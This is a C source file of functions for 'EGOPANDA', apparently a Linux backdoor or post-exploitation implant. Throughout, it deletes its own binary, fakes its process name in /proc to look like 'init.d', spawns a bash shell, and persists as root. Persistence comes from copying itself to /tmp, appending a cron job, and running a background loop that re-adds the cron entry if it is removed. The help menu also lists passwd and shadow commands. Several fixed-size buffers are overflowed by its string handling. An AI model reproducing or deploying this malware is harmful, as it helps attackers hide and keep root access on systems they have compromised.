/* This file contains various functions for EGOPANDA */

void deleteFromDisk(char *path)
{
    // remove the ran binary from the disk
    char command[50] = "rm -rf ";
    strcat(command, path);
    system(command);
}

void hideProcess()
{
    // attempt at getting rid of references to the name of the program
    // in the /proc/[pid] folder. Not sure on the usefullness/effectiveness
    // of this, may be removed
    int pid = getpid();
    char path[28] = "/proc/";
    char pidStr[6];
    char name[] = "init.d";

    snprintf(pidStr, 6 + sizeof(path), "%d", pid);
    strcat(path, pidStr);

    strcat(path, "/comm");

    FILE *comm = fopen(path, "w+");

    fwrite(name, sizeof(char), strlen(name), comm);
    fclose(comm);
}

void printStartup() 
{
    /* Consider removing */
    printf("[!] Starting EGOPANDA...\n");
}

void printHelp()
{
    /* TODO: Make this an array instead */
    printf("Available commands: \n\n");
    printf("help\t\tquit\t\texit\n");
    printf("clear\t\tversion\t\tls\n");
    printf("id\t\tshell\t\tpersist\n");
    printf("pid\t\troute\t\tnetstat\n");
    printf("passwd\t\tshadow\n");
    printf("\n");
}

void printVersion(char *version)
{
    printf("%s\n", version);
}

void cmdShell()
{
    char *shell = "/bin/bash";

    int pid = fork();
    if (pid == 0)
    {
        printf("[!] No prompt will be displayed!\n");
        fflush(stdout);
        execvp(shell, NULL);
        perror("exec");
        exit(1);
    } 
    else 
    {
        wait(NULL);
    }
}

void getPid()
{
    int pid = getpid();
    printf("[!] PID: %d\n", pid);
}

// This function runs in the background to 
// ensure that our cronjob is not removed
void bgPersist(char *line)
{
    pid_t pid; 
    int status;

    pid = fork();
    if (pid == 0)
    {
        // child write process
        while (1)
        {
            FILE *checkCrontab = fopen("/etc/crontab", "r");
            char readLine[128] = {0};
            int found = 0;

            while (!feof(checkCrontab))
            {
                fgets(readLine, 128, checkCrontab);
                if (strcmp(readLine, line) == 0)
                {
                    found = 1;
                    break;
                }
                else
                {
                    found = 0;
                }
            }
            fclose(checkCrontab);
            sleep(180);
            if (!found)
            {
                FILE *crontab = fopen("/etc/crontab", "a");
                fwrite(line, sizeof(char), strlen(line), crontab);
                fclose(crontab);
            }
        }
        exit(1);
    }
    else
    {
        // parent 
        wait(NULL);
    }
}

// makes a copy of a file, storing it in the specified destination
void copy(char *source, char * destination)
{
    int childExitStatus;
    pid_t pid;
    int status;

    if (!source || !destination) 
    {
        printf("[-] Could not get source or destination\n");
    }
    else
    {
        pid = fork();
        if (pid == 0)
        {
            // child copy process
            execl("/bin/cp", "/bin/cp", source, destination, (char *) 0);
        }
        else if (pid < 0)
        {
            /* could not start process */
            printf("[-] Could not start copy process\n");
        }
        else
        {
            /* parent process - wait for child */
            pid_t waitStatus = waitpid(pid, &childExitStatus, WNOHANG);
            if (waitStatus == -1)
            {
                printf("[-] Unknown error waiting for child process\n");
            }
            if (WIFEXITED(childExitStatus))
            {
                // exit code in childExitStatus
                status = WEXITSTATUS(childExitStatus); // zero is normal
            }
            else if (WIFSIGNALED(childExitStatus)) // killed child
            {
                //printf("[!] Child process killed\n");
            }
            else if (WIFSTOPPED(childExitStatus)) // stopped child
            {
                //printf("[!] child process stopped\n");
            }
        }
    }
}

void persist(char *source)
{
    FILE *crontab = fopen("/etc/crontab", "a");

    if (crontab == NULL)
    {
        printf("[-] Failed to edit crontab, are you root?\n");
    }
    else
    {
        // generate a random file name
        srand(time(NULL));
        char fileName[10];
        int num = (rand() % 100000) + 4700;
        snprintf(fileName, 10, "%d", num);

        // save copy of program to /tmp/
        char destination[16] = "/tmp/";
        strcat(destination, fileName);
        
        // let's maintain a foothold (will break after reboot
        // due to the fact we are saving the file to /tmp/)
        copy(source, destination);
        deleteFromDisk(source);
        printf("[!] EGOPANDA copied to '%s'\n", destination);

        // generate cronline, runs EGOPANDA from /tmp every 5 minutes 
        char line[34] = {0};
        strcat(line, "5 * * * * root ");
        strcat(line, destination);
        strcat(line, "\n");

        fwrite(line, sizeof(char), strlen(line), crontab);

        printf("[+] Cron job created! Running every 5 minutes\n");

        fclose(crontab);

        //cronstomp
        bgPersist(line);
    }
}